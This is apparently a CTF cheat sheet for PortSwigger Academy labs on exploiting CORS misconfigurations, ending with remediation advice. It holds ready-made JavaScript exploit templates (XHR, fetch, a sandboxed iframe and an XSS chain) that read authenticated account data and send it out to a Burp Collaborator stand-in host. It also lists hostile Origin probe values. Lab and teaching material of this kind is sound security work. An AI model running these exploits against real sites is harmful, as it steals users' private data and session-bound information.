# Cross-Origin Resource Sharing (CORS) — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, browser DevTools, Exploit Server  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

CORS misconfigurations allow malicious third-party websites to read sensitive, authenticated responses from a target application using JavaScript.

1. **Locate Sensitive Endpoints:** Find authenticated API endpoints returning private user data (e.g., `/accountDetails`, `/api/user`, `/api/keys`).
2. **Probe `Origin` Header Reflection:** In Burp Repeater, add/modify the `Origin` header and inspect the response:
   ```http
   Origin: https://evil.com
   Origin: null
   Origin: https://subdomain.target.net
   Origin: https://target.net.evil.com
   Origin: https://not-target.net
   ```
3. **Verify Critical CORS Headers:**
   - `Access-Control-Allow-Origin: <reflected_origin>`
   - `Access-Control-Allow-Credentials: true` *(Required for cookies/sessions to be included)*
4. **Construct Exploit:** Host JavaScript on your Exploit Server using `fetch()` or `XMLHttpRequest` with `credentials: 'include'`.
5. **Exfiltrate Data:** Send captured data to Burp Collaborator or log it on your exploit server.

---

## 2. Standard CORS Exploit Templates

### Template A: Standard Fetch with Credentials

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get', 'https://TARGET.net/accountDetails', true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        fetch('https://BURP-COLLABORATOR-SUBDOMAIN/?data=' + encodeURIComponent(this.responseText));
    }
</script>
```

---

### Template B: Modern `fetch()` API

```html
<script>
fetch('https://TARGET.net/accountDetails', {
    credentials: 'include'
})
.then(response => response.text())
.then(data => {
    fetch('https://BURP-COLLABORATOR-SUBDOMAIN/log?key=' + encodeURIComponent(data));
});
</script>
```

---

## 3. Academy Attack Scenarios & Bypasses

### 1. Arbitrary Origin Reflection
- **Vulnerability:** Server blindly trusts and reflects any `Origin` header.
- **Request:**
  ```http
  GET /accountDetails HTTP/2
  Host: target.net
  Origin: https://attacker.com
  Cookie: session=xyz
  ```
- **Response:**
  ```http
  Access-Control-Allow-Origin: https://attacker.com
  Access-Control-Allow-Credentials: true
  ```
- **Exploitation:** Deliver Template A directly via your Exploit Server.

---

### 2. Trusted `null` Origin
- **Vulnerability:** Server whitelists the `null` origin (commonly configured for local files or sandboxed frames) with credentials enabled.
- **Response:**
  ```http
  Access-Control-Allow-Origin: null
  Access-Control-Allow-Credentials: true
  ```
- **Exploitation:** Sandboxed iframes naturally generate an `Origin: null` request:
  ```html
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
      <script>
          var req = new XMLHttpRequest();
          req.onload = function() {
              fetch('https://BURP-COLLABORATOR-SUBDOMAIN/?data=' + encodeURIComponent(this.responseText));
          };
          req.open('GET', 'https://TARGET.net/accountDetails', true);
          req.withCredentials = true;
          req.send();
      </script>
  "></iframe>
  ```

---

### 3. Flawed Regex: Prefix / Suffix Domain Trust
- **Vulnerability:** Server uses loose regex to validate subdomains (e.g., checking if origin ends with or starts with `target.net`).
- **Test Payloads:**
  - `Origin: https://target.net.attacker.com` *(Suffix match)*
  - `Origin: https://not-target.net` *(Prefix match)*
- **Response:** If allowed with credentials, host the exploit on a matching domain or subdomain.

---

### 4. Trusted Insecure Subdomains (Chained with XSS)
- **Vulnerability:** Server allows all subdomains (`*.target.net`) or insecure HTTP protocols (`http://target.net`).
- **Attack Chain:**
  1. Find an XSS vulnerability on an allowed subdomain (e.g., `stock.target.net`).
  2. Inject an XSS payload on `stock.target.net` that fires a cross-origin request to `https://target.net/accountDetails`.
  3. Because `stock.target.net` is whitelisted by CORS, the browser permits reading the response.

```html
<script>
    document.location = "http://stock.target.net/?productId=1<script>var req=new XMLHttpRequest();req.onload=function(){fetch('https://BURP-COLLABORATOR-SUBDOMAIN/?c='+this.responseText);};req.open('get','https://TARGET.net/accountDetails',true);req.withCredentials=true;req.send();%3C/script>";
</script>
```

---

## 4. Burp Suite Testing Workflow

1. In **Proxy → HTTP history**, find requests returning sensitive data.
2. Send request to **Repeater**.
3. Add header: `Origin: https://attacker.com`.
4. Check if `Access-Control-Allow-Origin: https://attacker.com` AND `Access-Control-Allow-Credentials: true` are present.
5. If denied, test edge cases:
   - `Origin: null`
   - `Origin: https://TARGET.net.attacker.com`
   - `Origin: https://subdomain.TARGET.net`
6. Once a misconfiguration is confirmed, paste the exploit into the **Exploit Server** body and click **Deliver exploit to victim**.

---

## 5. CTF Quick Reference

| Server Configuration | Response Behavior | Exploit Method |
|---|---|---|
| **Reflects any Origin** | `ACAO: https://attacker.com` + `ACAC: true` | Direct fetch/XHR exploit |
| **Whitelists `null`** | `ACAO: null` + `ACAC: true` | Sandboxed `<iframe>` with `srcdoc` |
| **Suffix match flaw** | `ACAO: https://target.net.evil.com` | Host exploit on `target.net.evil.com` |
| **Prefix match flaw** | `ACAO: https://evil-target.net` | Host exploit on `evil-target.net` |
| **Wildcard `*`** | `ACAO: *` *(No credentials)* | Public data only; cannot steal user sessions |

---

## 6. Remediation

- **Never reflect arbitrary `Origin` headers dynamically** when `Access-Control-Allow-Credentials` is `true`.
- **Do not trust `null` origin:** Disallow `null` in production ACAO configurations.
- **Strict Whitelisting:** Use exact string comparisons against an explicit list of trusted domains:
  ```http
  Access-Control-Allow-Origin: https://trusted-partner.com
  Access-Control-Allow-Credentials: true
  ```
- **Avoid Wildcard Subdomain Matching** unless all subdomains have identical security guarantees.
